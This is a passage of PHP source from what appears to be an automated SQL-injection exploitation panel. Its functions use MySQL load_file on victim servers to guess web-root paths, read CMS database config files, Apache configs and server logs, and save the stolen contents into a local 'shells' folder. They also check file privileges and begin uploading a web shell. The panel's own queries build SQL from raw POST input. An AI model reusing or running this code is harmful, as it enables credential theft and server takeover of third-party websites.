		$path2[] = '/var/www/html/hosts/' . $domen . '/cgi-bin/';
		$path2[] = '/var/www/vhosts/' . $domen . '/httpdocs/';
		$path2[] = '/home/users/user/domains/' . $domen . '/';
		$path2[] = '/srv/www/' . $domen . '/';
		$path2[] = '/' . $domen . '/';
		$path2[] = '/var/www/html/domain/' . $domen . '/';
		$path2[] = '/usr/home/' . $domen . '/htdocs/';
		$path2[] = '/home/' . $domen . '/domains/' . $domen . '/public_html/';
		$path2[] = '/usr/home/www/' . $domen . '/htdocs/';
		$path2[] = '/www/vhosts/' . $domen . '/html/';
		$path2[] = '/home/' . $domen . '/public_html/';
		$path2[] = '/var/www/virtual_client/burdin/www/';
		$path2[] = '/home/opt/' . $domen . '/www/forum/html/';
		$path2[] = '/var/www/admin/data/www/' . $domen . '/';
		$path2[] = 'usr/local/zend/apache2/htdocs/';
		$path2[] = 'usr/local/zend/apache2/' . $domen . '/';
		$etc_passwd = $this->mysqlInj->load_passwd();

		foreach ($etc_passwd as $load_passwd_one ) {
			$load_passwd_new[] = $load_passwd_one . '/';

			foreach ($path as $path_one ) {
				$str = $load_passwd_one . $path_one;
				$path_new[] = $str;
			}
		}

		$path_new2 = array_merge($path_new, $load_passwd_new);
		$path_new3 = array_merge($path_new2, $path2);
		$this->d($path_new3, '$path_new3');

		if (1 < count($path_new3)) {
			$i = 1;

			foreach ($path_new3 as $conf_new2 ) {
				while ($load_f_new != '') {
					$url = $conf_new2 . 'index.php';
					$load_f_new = $this->mysqlInj->load_file($url);
					$path = str_replace('index.php', '', $url);
					$this->d($path, '$path');
					mkdir($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/shells/' . $domen, 511);
					$file = 'index.' . $i . '.txt';
					$ff = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/shells/' . $domen . '/' . $file;
					echo '<a  href=\'/shells/' . $domen . '/' . $file . '\' target=\'_blank\'>' . $path . 'index.php</a>';
					file_put_contents($ff, $load_f_new);
					$data2['path'][] = $path;
					$this->path[] = $path;
					$this->Session->write('inject', $data2);
					$this->Filed->query('UPDATE  `posts_one` SET  `path' . $i . '` =  \'' . $path . '\',`site' . $i . '`=\'' . $domen . '\' WHERE  `domen` =\'' . $domen . '\'');
					$this->d('UPDATE  `posts_one` SET  `path' . $i . '` =  \'' . $path . '\',`site' . $i . '`=\'' . $domen . '\' WHERE  `domen` =\'' . $domen . '\'');
					++$i;

					if ($i == 5) {
						break;
					}

				}
			}
		}

	}

	public function search_path_cookies($domen)
	{
		$uagent = array('Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; dial', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; dial; E-nrgyPlus; .NET CLR 1.1.4322; InfoPath.1)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; dial; SV1; .NET CLR 1.0.3705)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; ds-66843412; Sgrunt|V109|1|S-66843412|dial; .NET CLR 1.1.4322)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; eMusic DLM/3; MSN Optimized;US; MSN Optimized;US)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; elertz 2.4.025; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; elertz 2.4.179[128]; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; generic_01_01; InfoPath.1)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; generic_01_01; YPC 3.2.0; .NET CLR 1.1.4322; yplus 5.3.04b)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iOpus-I-M; .NET CLR 1.1.4322)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; InfoPath.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; Sgrunt|V109|1746|S-1740532934|dialno; snprtz|dialno; .NET CLR 2.0.50727)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; acc=; YPC 3.2.0; .NET CLR 1.0.3705; .NET CLR 1.1.4322; IEMB3; IEMB3; yplus 5.1.04b)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; acc=none; FunWebProducts; .NET CLR 1.1.4322)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; acc=none; SV1; snprtz|S04087544802137; .NET CLR 1.1.4322)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; yplus 5.6.02b)');
		$ua = trim($uagent[mt_rand(0, sizeof($uagent) - 1)]);
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, 'http://' . $domen);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_HEADER, 1);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch, CURLOPT_ENCODING, '');
		curl_setopt($ch, CURLOPT_USERAGENT, '1312\'][*&//2!)');
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
		curl_setopt($ch, CURLOPT_TIMEOUT, 10);
		curl_setopt($ch, CURLOPT_MAXREDIRS, 10);
		curl_setopt($ch, CURLOPT_COOKIE, 'PHPSESSID=aaaaa[256]];\'');
		$out = curl_exec($ch);
		$err = curl_errno($ch);
		$errmsg = curl_error($ch);
		$head = curl_getinfo($ch);

		if (preg_match('/session_start()/i', $out)) {
			$this->d($err, '$err');
			$this->d($errmsg, '$errmsg');
			$this->d($out, '$out');
			$this->d($head, '$head');
		}
		 else {
			echo 'Через куки не хочет';
		}

		curl_close($ch);
	}

	public function search_path_config($id)
	{
		$time_all = time();
		$time2 = 3000;
		ignore_user_abort(true);
		set_time_limit(0);
		$data = $this->Session->read('inject');
		$squle['Post'] = $data['posts_one'];
		$cards = $this->cards;
		unset($data['orders']);
		$this->workup();
		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();

		if (2 < strlen($squle['Post']['sleep'])) {
			$set = $squle['Post']['sleep'];
		}
		 else {
			$set = false;
		}

		$post_id = $squle['Post']['id'];
		$url2 = $squle['Post']['url'];

		if ($this->domen != '') {
			$domen = $this->domen;
		}
		 else {
			$domen = $squle['Post']['domen'];
		}

		if (($squle['Post']['path1'] != '') && ($squle['Post']['path1'] != '0')) {
			$path1 = $squle['Post']['path1'];
			$this->path[] = $squle['Post']['path1'];
		}


		if (($squle['Post']['path2'] != '') && ($squle['Post']['path2'] != '0')) {
			$path2 = $squle['Post']['path2'];
			$this->path[] = $squle['Post']['path2'];
		}


		if (($squle['Post']['path3'] != '') && ($squle['Post']['path3'] != '0')) {
			$path3 = $squle['Post']['path3'];
			$this->path[] = $squle['Post']['path3'];
		}


		$this->path = array_unique($this->path);
		$this->d($this->path, 'pathh');
		$this->mysqlInj->inject($squle['Post']['header'] . '::' . trim($squle['Post']['gurl']), $data, $set);
		$card = '';
		$i = 1;
		$this->d($pass);
		$this->tableOrder = '';
		$post_id = $data['posts_one']['id'];
		$this->workup();

		if (0 < count($this->path)) {
			$path[] = $this->path;
			$path_new = $this->path;
		}
		 else {
			$path[] = '/data/www/' . $domen . '/';
			$path[] = '/www/' . $domen . '/';
			$path[] = '/domains/' . $domen . '/';
			$path[] = '/domains/public_html/' . $domen . '/';
			$path[] = '/public_html/' . $domen . '/';
			$path[] = '/public_html/';
			$path[] = '/' . $domen . '/';
			$load_passwd = $this->mysqlInj->load_passwd();
			$this->d($load_passwd, 'load_passwd');

			foreach ($load_passwd as $load_passwd_one ) {
				$load_passwd_new[] = $load_passwd_one . '/';

				foreach ($path as $path_one ) {
					$path_new[] = $load_passwd_one . $path_one;
				}
			}

			$path_new2 = array_merge($path_new, $load_passwd_new);
			$this->d($path_new2, '$path_new2');
		}

		$conf[] = 'fig.php';
		$conf[] = 'admin/db_fns.php';
		$conf[] = 'wp-config.php';
		$conf[] = 'configuration.php';
		$conf[] = 'engine/data/dbconfig.php';
		$conf[] = 'sites/default/settings.php';
		$conf[] = 'config.php';
		$conf[] = 'app/etc/local.xml';
		$conf[] = 'config.local.php';
		$conf[] = 'manager/includes/config.inc.php';
		$conf[] = 'typo3conf/localconf.php';
		$conf[] = 'vars.inc.php';
		$conf[] = 'application/config/config.php';
		$conf[] = 'bitrix/php_interface/dbconn.php';
		$conf[] = 'kernel/wbs.xml';
		$conf[] = 'config/settings.inc.php';
		$conf[] = 'cfg/connect.inc.php';
		$conf[] = 'phpshop/inc/config.ini';
		$conf[] = 'system/data/db.php';
		$conf[] = 'core/config/config.inc.php';
		$conf[] = 'protected/config/main.php';
		$conf[] = 'includes/vars.php';
		$conf[] = 'USER/CONFIG.AP';
		$conf[] = 'adm/config.php';
		$conf[] = 'admin/config.php';
		$conf[] = 'administrator/config.php';
		$conf[] = 'cgi-bin/statusconfig.pl';
		$conf[] = 'class/fckeditor/fckconfig.js';
		$conf[] = 'config/config.txt';
		$conf[] = 'config.inc';
		$conf[] = 'config.php';
		$conf[] = 'config.txt';
		$conf[] = 'inc/config.inc';
		$conf[] = 'inc/config.php';
		$conf[] = 'inc/config.inc';
		$conf[] = 'inludes/config.php';
		$conf[] = 'inludes/config.inc';
		$conf[] = 'inludes/config.inc';
		$conf[] = 'inlude/config.php';
		$conf[] = 'inlude/config.inc';
		$conf[] = 'inlude/config.inc';
		$conf[] = 'inludes/conf.php';
		$conf[] = 'inludes/conf.inc';
		$conf[] = 'inludes/conf.inc';
		$conf[] = 'FCKeditor/fckconfig.js';
		$conf[] = 'forums//adm/config.php';
		$conf[] = 'forums//admin/config.php';
		$conf[] = 'forums//administrator/config.php';
		$conf[] = 'forums/config.php';
		$conf[] = 'inc/config.php';
		$conf[] = 'inc/fckeditor/fckconfig.js';
		$conf[] = 'config.conf';
		$conf[] = 'modules/fckeditor/fckeditor/fckconfig.js';
		$conf[] = 'myinvoicer/config.inc';
		$conf[] = 'pt_config.inc';
		$conf[] = 'Script/fckeditor/fckconfig.js';
		$conf[] = 'servlet/oracle.xml.xsql.XSQLServlet/xsql/lib/XSQLConfig.xml';
		$conf[] = 'shop/php_files/site.config.php+';
		$conf[] = 'sites/all/libraries/fckeditor/fckconfig.js';
		$conf[] = 'sites/all/modules/fckeditor/fckeditor/fckconfig.js';
		$conf[] = 'soapConfig.xml';
		$conf[] = 'soapdocs/webapps/soap/WEB-INF/config/soapConfig.xml';
		$conf[] = 'stconfig.nsf';
		$conf[] = 'XSQLConfig.xml';
		$conf[] = 'sql.config';
		$conf[] = 'sql.inf';

		if (0 < count($path_new)) {
			$i = 1;

			foreach ($path_new as $conf_new2 ) {
				$new = time();
				$razn = $new - $time_all;

				if ($time2 < $razn) {
					$this->d('TIME!!!! ALL');
					break;
				}


				foreach ($conf as $conf_one ) {
					$new = time();
					$razn = $new - $time_all;

					if ($time2 < $razn) {
						$this->d('TIME!!!! ALL');
						break;
					}


					$file = $conf_one;
					$load_f_conf = $this->mysqlInj->load_file($conf_new2 . $conf_one);
					$this->d($conf_new2 . $conf_one);

					if ($load_f_conf != '') {
						$this->d($conf_new2 . $conf_one, '$conf_new2.$conf_one');
						mkdir($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/shells/' . $domen, 511);
						$file = 'conf' . $i . '.txt';
						$ff = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/shells/' . $domen . '/' . $file;
						echo '<a  href=\'/shells/' . $domen . '/' . $file . '\' target=\'_blank\'>' . $file . '</a>';
						file_put_contents($ff, $load_f_conf);
						$data2['path_conf{$i}'][] = $conf_new2 . $conf_one;
						$data['path_conf'] = $data2;
						$path_conf = $conf_new2 . $conf_one;
						$this->Session->write('inject', $data);
						$this->Filed->query('UPDATE  `posts_one` SET  `path_conf' . $i . '` =  \'' . $path_conf . '\' WHERE  `domen` =\'' . $domen . '\'');
						$this->d('UPDATE  `posts_one` SET  `path_conf' . $i . '` =  \'' . $path_conf . '\' WHERE  `domen` =\'' . $domen . '\'');
						++$i;
					}

				}
			}
		}


		exit();
	}

	public function search_httpd($id)
	{
		ignore_user_abort(true);
		set_time_limit(0);
		$data = $this->Session->read('inject');
		$squle['Post'] = $data['posts_one'];
		$cards = $this->cards;
		unset($data['orders']);
		$this->workup();
		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();

		if (2 < strlen($squle['Post']['sleep'])) {
			$set = $squle['Post']['sleep'];
		}
		 else {
			$set = false;
		}

		$post_id = $squle['Post']['id'];
		$url2 = $squle['Post']['url'];
		$domen = $squle['Post']['domen'];
		$this->mysqlInj->inject($squle['Post']['header'] . '::' . trim($squle['Post']['gurl']), $data, $set);
		$card = '';
		$i = 1;
		$this->d($pass);
		$this->tableOrder = '';
		$post_id = $data['posts_one']['id'];
		$this->workup();
		$path[] = '/usr/local/apache2/conf/extra/httpd-vhosts.conf';
		$path[] = '/usr/local/apache/conf/httpd.conf/';
		$path[] = '/usr/local/apache2/conf/httpd.conf';
		$path[] = '/usr/local/apache/httpd.conf';
		$path[] = '/usr/local/apache2/httpd.conf';
		$path[] = '/usr/local/httpd/conf/httpd.conf';
		$path[] = '/usr/local/etc/apache/conf/httpd.conf';
		$path[] = '/usr/local/etc/apache2/conf/httpd.conf';
		$path[] = '/usr/local/etc/httpd/conf/httpd.conf';
		$path[] = '/usr/apache2/conf/httpd.conf';
		$path[] = '/usr/apache/conf/httpd.conf';
		$path[] = '/usr/local/apps/apache2/conf/httpd.conf';
		$path[] = '/usr/local/apps/apache/conf/httpd.conf';
		$path[] = '/etc/apache/conf/httpd.conf';
		$path[] = '/etc/apache2/conf/httpd.conf';
		$path[] = '/etc/httpd/conf/httpd.conf';
		$path[] = '/etc/http/conf/httpd.conf';
		$path[] = '/etc/apache2/httpd.conf';
		$path[] = '/etc/httpd/httpd.conf';
		$path[] = '/etc/http/httpd.conf';
		$path[] = '/etc/httpd.conf';
		$path[] = '/opt/apache/conf/httpd.conf';
		$path[] = '/opt/apache2/conf/httpd.conf';
		$path[] = '/var/www/conf/httpd.conf';
		$path[] = '/conf/httpd.conf';
		$path[] = '/var/www/conf/httpd.conf';
		$path[] = '/etc/httpd/conf/extra/httpd-vhosts.conf';
		$path[] = '/etc/apache/conf/extra/httpd-vhosts.conf';
		$path[] = '/etc/apache2/conf/extra/httpd-vhosts.conf';
		$path[] = '/etc/httpd/conf.d/vhosts.conf';
		$path[] = '/etc/apache/conf.d/vhosts.conf';
		$path[] = '/etc/apache2/conf.d/vhosts.conf';
		$path[] = '/var/www/vhosts/' . $domen;
		$path[] = '/etc/httpd/vhost.d/' . $domen;
		$path[] = '/etc/apache/vhost.d/' . $domen;
		$path[] = '/etc/apache2/vhost.d/' . $domen;
		$path[] = '/opt/lampp/etc/extra/httpd-vhosts.conf';
		$path[] = '/usr/local/zend/etc/sites.d/zend-default-vhost-80.conf';
		$path[] = '/usr/local/zend/etc/httpd.conf';
		$path[] = '/etc/httpd/conf.d/postfixadmin.conf';
		$path[] = '/etc/httpd/conf.d/postfixadmin.conf';
		$path[] = '/var/www/html/postfixadmin/config.inc.php';
		$path[] = '/etc/httpd/conf.d/subversion.conf';
		$path[] = '/etc/httpd/conf.d/phpMyAdmin.conf';
		$path[] = '/etc/apache2/default-server.conf';
		$path[] = '/etc/apache/default-server.conf';
		$path[] = '/usr/local/apps/apache2/conf/httpd.conf';
		$path[] = '/usr/local/apps/apache/conf/httpd.conf';
		$path[] = '/opt/apache/conf/extra/httpd-vhosts.conf';
		$path[] = '/opt/apache/conf/extra/httpd-default.conf';
		$path[] = '/opt/apache2/conf/extra/httpd-vhosts.conf';
		$path[] = '/opt/apache2/conf/extra/httpd-default.conf';
		$path[] = '/private/etc/httpd/httpd.conf';
		$path[] = '/private/etc/httpd/httpd.conf.default';
		$path[] = '/usr/local/php/httpd.conf.php';
		$path[] = '/usr/local/php4/httpd.conf.php';
		$path[] = '/usr/local/php5/httpd.conf.php';
		$path[] = '/usr/local/php/httpd.conf';
		$path[] = '/usr/local/php4/httpd.conf';
		$path[] = '/usr/local/php5/httpd.conf';
		$path[] = '/Volumes/Macintosh_HD1/opt/httpd/conf/httpd.conf';
		$path[] = '/Volumes/Macintosh_HD1/opt/apache/conf/httpd.conf';
		$path[] = '/Volumes/Macintosh_HD1/opt/apache2/conf/httpd.conf';
		$path[] = '/Volumes/Macintosh_HD1/usr/local/php/httpd.conf.php';
		$path[] = '/Volumes/Macintosh_HD1/usr/local/php4/httpd.conf.php';
		$path[] = '/Volumes/Macintosh_HD1/usr/local/php5/httpd.conf.php';
		$path[] = '/usr/local/etc/apache/vhosts.conf';
		$path[] = '/usr/local/etc/apache2/vhosts.conf';
		$path[] = '/usr/local/apache/conf/vhosts.conf';
		$path[] = '/usr/local/apache2/conf/vhosts.conf';
		$path[] = '/usr/local/apache/conf/vhosts-custom.conf';
		$path[] = '/usr/local/apache2/conf/vhosts-custom.conf';
		$path[] = '/usr/local/apache/conf/modsec.conf';
		$path[] = '/etc/nginx/nginx.conf';
		$path[] = '/usr/local/etc/nginx/nginx.conf';
		$path[] = '/usr/local/nginx/conf/nginx.conf';
		$path[] = '/etc/apache2/sites-available/default';
		$path[] = '/etc/apache2/sites-available/default-ssl';
		$path[] = '/etc/apache2/apache2.conf';
		$path[] = '/etc/apache2/httpd.conf';
		$path[] = '/etc/apache2/ports.conf';
		$path[] = '/etc/apache2/sites-enabled/000-default';
		$path[] = '/etc/apache2/sites-enabled/default';
		$this->d($path, '$path');

		foreach ($path as $conf_new2 ) {
			$load_f_new = $this->mysqlInj->load_file($conf_new2);

			if ($load_f_new != '') {
				$this->d($load_f_new, $conf_new2);
				$kk = 'yes';
			}

		}

		if ($kk != 'yes') {
			$this->d('httpd не нашел');
		}


		exit();
	}

	public function search_logs($id)
	{
		ignore_user_abort(true);
		set_time_limit(0);
		$data = $this->Session->read('inject');
		$squle['Post'] = $data['posts_one'];
		$cards = $this->cards;
		unset($data['orders']);
		$this->workup();
		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();

		if (2 < strlen($squle['Post']['sleep'])) {
			$set = $squle['Post']['sleep'];
		}
		 else {
			$set = false;
		}

		$post_id = $squle['Post']['id'];
		$url2 = $squle['Post']['url'];
		$domen = $squle['Post']['domen'];
		$this->mysqlInj->inject($squle['Post']['header'] . '::' . trim($squle['Post']['gurl']), $data, $set);
		$card = '';
		$i = 1;
		$this->d($pass);
		$this->tableOrder = '';
		$post_id = $data['posts_one']['id'];
		$this->workup();
		$path[] = '/var/log/error_log';
		$path[] = '/var/log/access_log';
		$path[] = '/var/log/apache/error.log';
		$path[] = '/var/log/apache/error_log';
		$path[] = '/usr/local/apache/logs/error.log';
		$path[] = '/usr/local/apache/logs/error_log';
		$path[] = '/var/log/apache2/error.log';
		$path[] = '/var/log/apache2/error_log';
		$path[] = '/usr/local/apache2/logs/error.log';
		$path[] = '/usr/local/apache2/logs/error_log';
		$path[] = '/var/www/logs/error.log';
		$path[] = '/var/www/logs/error_log';
		$path[] = '/var/log/access_log';
		$path[] = '/var/log/apache/access.log';
		$path[] = '/var/www/logs/access.log';
		$path[] = '/usr/local/apache/logs/access.log';
		$path[] = '/var/www/logs/access_log';
		$path[] = '/etc/httpd/logs/error.log';
		$path[] = '/etc/httpd/logs/error_log';
		$path[] = '/etc/httpd/logs/acces.log';
		$path[] = '/etc/httpd/logs/acces_log';
		$path[] = '/var/log/httpd/access_log';
		$path[] = '/var/www/vhosts/logs/error_log';
		$path[] = '/etc/httpd/vhost.d/logs/error_log';
		$path[] = '/etc/apache/vhost.d/logs/error_log';
		$path[] = '/etc/apache2/vhost.d/logs/error_log';
		$path[] = '/var/www/vhosts/logs/error.log';
		$path[] = '/etc/httpd/vhost.d/logs/error.log';
		$path[] = '/etc/apache/vhost.d/logs/error.log';
		$path[] = '/etc/apache2/vhost.d/logs/error.log';
		$path[] = '/var/www/vhosts/logs/access_log';
		$path[] = '/etc/httpd/vhost.d/logs/access_log';
		$path[] = '/etc/apache/vhost.d/logs/access_log';
		$path[] = '/etc/apache2/vhost.d/logs/access_log';
		$path[] = '/opt/lampp/logs/access_log';
		$path[] = '/opt/lampp/logs/error_log';
		$path[] = '/opt/lampp/logs/access.log';
		$path[] = '/opt/lampp/logs/error.log';
		$path[] = '/opt/xampp/logs/access_log';
		$path[] = '/opt/xampp/logs/error_log';
		$path[] = '/opt/xampp/logs/access.log';
		$path[] = '/opt/xampp/logs/error.log';
		$path[] = '/usr/local/cpanel/logs';
		$path[] = '/usr/local/cpanel/logs/stats_log';
		$path[] = '/usr/local/cpanel/logs/access_log';
		$path[] = '/usr/local/cpanel/logs/error_log';
		$path[] = '/usr/local/cpanel/logs/license_log';
		$path[] = '/usr/local/cpanel/logs/login_log';
		$path[] = '/usr/local/cpanel/logs/stats_log';
		$path[] = '/var/log/mysql/mysql-bin.log';
		$path[] = '/var/log/mysql.log';
		$path[] = '/var/log/mysqlderror.log';
		$path[] = '/var/log/mysql/mysql.log';
		$path[] = '/var/log/mysql/mysql-slow.log';
		$path[] = '/etc/firewall.conf';
		$path[] = '/var/mysql.log';
		$path[] = '/var/log/exim_mainlog';
		$path[] = '/var/log/exim/mainlog';
		$path[] = '/var/log/maillog';
		$path[] = '/var/log/exim_paniclog';
		$path[] = '/var/log/exim/paniclog';
		$path[] = '/var/log/exim/rejectlog';
		$path[] = '/var/log/exim_rejectlog';
		$path[] = '/var/log/pure-ftpd/pure-ftpd.log';
		$path[] = '/logs/pure-ftpd.log';
		$path[] = '/var/log/pureftpd.log';
		$path[] = '/var/log/ftp-proxy/ftp-proxy.log';
		$path[] = '/var/log/vsftpd.log';
		$path[] = '/etc/logrotate.d/vsftpd.log';
		$path[] = '/var/log/xferlog';
		$path[] = '/var/adm/log/xferlog';
		$path[] = '/var/log/ftplog';
		$this->d($path, '$path');

		foreach ($path as $conf_new2 ) {
			$load_f_new = $this->mysqlInj->load_file($conf_new2);

			if ($load_f_new != '') {
				$this->d($load_f_new, $conf_new2);
				$kk = 'yes';
			}

		}

		if ($kk != 'yes') {
			$this->d('httpd не нашел');
		}


		exit();
	}

	public function file_path1()
	{
		$this->d($_POST);
		$domen = $_POST['domen'];
		$path2 = $_POST['file_path1'];
		$path2 = trim($path2);
		$kk = explode(';', $path2);
		$path = $kk[0];

		if (isset($kk[1])) {
			$site = $kk[1];
		}
		 else {
			$site = $domen;
		}

		$sl = substr($path, -1);
		$this->d($sl, 'sl');

		if ($sl == '/') {
			$path_new = $path;
		}
		 else {
			$path_new = $path . '/';
		}

		if ($path2 == '0') {
			$path_new = 0;
			$site = 0;
		}


		if ($this->Filed->query('UPDATE  `posts_one` SET  `path1` =  \'' . $path_new . '\',`site1` = \'' . $site . '\' WHERE  `domen` =\'' . $domen . '\'')) {
			$this->d($path_new, 'UPDATE  `posts_one` SET  `path1` =  \'' . $path_new . '\',`site1` = \'' . $site . '\' WHERE  `domen` =\'' . $domen . '\'');
		}

	}

	public function file_path2()
	{
		$this->d($_POST);
		$domen = $_POST['domen'];
		$path2 = $_POST['file_path2'];
		$path2 = trim($path2);
		$kk = explode(';', $path2);
		$path = $kk[0];

		if (isset($kk[1])) {
			$site = $kk[1];
		}
		 else {
			$site = $domen;
		}

		$sl = substr($path, -1);
		$this->d($sl, 'sl');

		if ($sl == '/') {
			$path_new = $path;
		}
		 else {
			$path_new = $path . '/';
		}

		if ($path2 == '0') {
			$path_new = 0;
			$site = 0;
		}


		if ($this->Filed->query('UPDATE  `posts_one` SET  `path2` =  \'' . $path_new . '\',`site2` = \'' . $site . '\' WHERE  `domen` =\'' . $domen . '\'')) {
			$this->d($path_new, 'UPDATE  `posts_one` SET  `path2` =  \'' . $path_new . '\',`site2` = \'' . $site . '\' WHERE  `domen` =\'' . $domen . '\'');
		}

	}

	public function file_path3()
	{
		$this->d($_POST);
		$domen = $_POST['domen'];
		$path2 = $_POST['file_path3'];
		$path2 = trim($path2);
		$kk = explode(';', $path2);
		$path = $kk[0];

		if (isset($kk[1])) {
			$site = $kk[1];
		}
		 else {
			$site = $domen;
		}

		$sl = substr($path, -1);
		$this->d($sl, 'sl');

		if ($sl == '/') {
			$path_new = $path;
		}
		 else {
			$path_new = $path . '/';
		}

		if ($path2 == '0') {
			$path_new = 0;
			$site = 0;
		}


		if ($this->Filed->query('UPDATE  `posts_one` SET  `path3` =  \'' . $path_new . '\',`site3` = \'' . $site . '\' WHERE  `domen` =\'' . $domen . '\'')) {
			$this->d($path_new, 'UPDATE  `posts_one` SET  `path3` =  \'' . $path_new . '\',`site3` = \'' . $site . '\' WHERE  `domen` =\'' . $domen . '\'');
		}

	}

	public function file_path_read()
	{
		ignore_user_abort(true);
		set_time_limit(0);
		$data = $this->Session->read('inject');
		$squle['Post'] = $data['posts_one'];
		$cards = $this->cards;
		unset($data['orders']);
		$this->workup();
		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();

		if (2 < strlen($squle['Post']['sleep'])) {
			$set = $squle['Post']['sleep'];
		}
		 else {
			$set = false;
		}

		$post_id = $squle['Post']['id'];
		$url2 = $squle['Post']['url'];
		$domen = $squle['Post']['domen'];
		$this->mysqlInj->inject($squle['Post']['header'] . '::' . trim($squle['Post']['gurl']), $data, $set);
		$card = '';
		$i = 1;
		$this->d($pass);
		$this->tableOrder = '';
		$post_id = $data['posts_one']['id'];
		$path = $_POST['file_path'];
		$out = $this->mysqlInj->load_file($path);
		header('Content-type: text/txt');
		print_r($out);
		exit();
	}

	public function file_cookies()
	{
		$domen = $_POST['domen'];
		$path2 = $_POST['file_cookies'];
		$path2 = trim($path2);

		if ($this->Filed->query('UPDATE  `posts_one` SET  `cookies` =  \'' . $path2 . '\' WHERE  `domen` =\'' . $domen . '\'')) {
			$this->d($path2, '  OK UPDATE  `posts_one` SET  `cookie` =  \'' . $path2 . '\' WHERE  `domen` =\'' . $domen . '\'');
			$this->d('Нажмите обновить на странице, чтобы увидеть изменения');
		}


		exit();
	}

	public function file_potok()
	{
		$domen = $_POST['domen'];
		$path2 = $_POST['file_potok'];
		$path2 = trim($path2);
		$this->d('UPDATE  `settings` SET  `name` = \'' . $path2 . '\' where `name`=\'potok\'');

		if ($this->Filed->query('UPDATE  `settings` SET  `value` = \'' . $path2 . '\' where `name`=\'potok\'')) {
			$this->d('Нажмите обновить на странице, чтобы увидеть изменения');
		}


		exit();
	}

	public function sqliShell($id)
	{
		$file = $this->Post->query('SELECT count(*) as count FROM `posts` WHERE `file_priv`=1 limit 1');

		if (intval($file[0][0]['count']) !== 0) {
		}


		$this->d($file[0][0]['count'], 'count file_priv');
		$file_priv = $this->Post->query('SELECT * FROM `posts` WHERE `file_priv`=1 limit 1');

		foreach ($file_priv as $squle ) {
			$this->d($squle, 'sqlule');
			$fieldcount = $this->Post->query('SELECT * FROM  `fileds` WHERE  `post_id` =' . $squle['posts']['id']);
			$squle['Post'] = $squle['posts'];

			if (2 < strlen($squle['Post']['sleep'])) {
				$set = $squle['Post']['sleep'];
				$this->d($set, 'set');
			}
			 else {
				$set = false;
			}

			$this->mysqlInj = new $this->Injector();
			$this->mysqlInj->inject($squle['Post']['header'] . '::' . $squle['Post']['gurl'], $squle, $set);
			$data = $this->mysqlInj->mysqlGetValue('mysql', 'user', 'file_priv');
			$this->d($data, 'data');
			exit();
		}
	}

	public function upload_shell($name, $num)
	{
		ignore_user_abort(true);
		set_time_limit(0);
		$data = $this->Session->read('inject');
		$squle['Post'] = $data['posts_one'];
		$cards = $this->cards;
		unset($data['orders']);
		$this->workup();
		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();

		if (2 < strlen($squle['Post']['sleep'])) {
			$set = $squle['Post']['sleep'];
		}
		 else {
			$set = false;
		}

		$post_id = $squle['Post']['id'];
		$url2 = $squle['Post']['url'];

		if (($squle['Post']['site1'] != '') && ($squle['Post']['site1'] != '0') && ($num == 1)) {
			$domen = $squle['Post']['site1'];
		}
		 else if (($squle['Post']['site2'] != '') && ($squle['Post']['site2'] != '0') && ($num == 2)) {
			$domen = $squle['Post']['site2'];
		}
		 else if (($squle['Post']['site3'] != '') && ($squle['Post']['site3'] != '0') && ($num == 3)) {
			$domen = $squle['Post']['site3'];
		}
		 else {
			$domen = $squle['Post']['domen'];
		}

		$this->domen = $domen;

		if (($squle['Post']['path1'] != '') && ($squle['Post']['path1'] != '0') && ($num == 1)) {
			$this->path[] = $squle['Post']['path1'];
		}
		 else if (($squle['Post']['path2'] != '') && ($squle['Post']['path2'] != '0') && ($num == 2)) {
			$this->path[] = $squle['Post']['path2'];
		}
		 else if (($squle['Post']['path3'] != '') && ($squle['Post']['path3'] != '0') && ($num == 3)) {
			$this->path[] = $squle['Post']['path3'];
		}


		$this->d($num, 'num');
		$this->d($domen, 'domen');
		$this->d($this->path, 'path');
		$this->d('SHAG 1 - find path');

		if (count($this->path) == 0) {
			$this->d('запускаем поиск путей на автомате');
			$this->search_path();
			$this->path = array_unique($this->path);
		}


		if (count($this->path) == 0) {
			$this->d('Не могу найти пути, укажите вручную');
			exit();
		}
		 else {
			$this->d($this->path, 'найденные пути');
		}

		$this->d('SHAG 2 - find dirs');
		mkdir($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/shells/' . $domen);
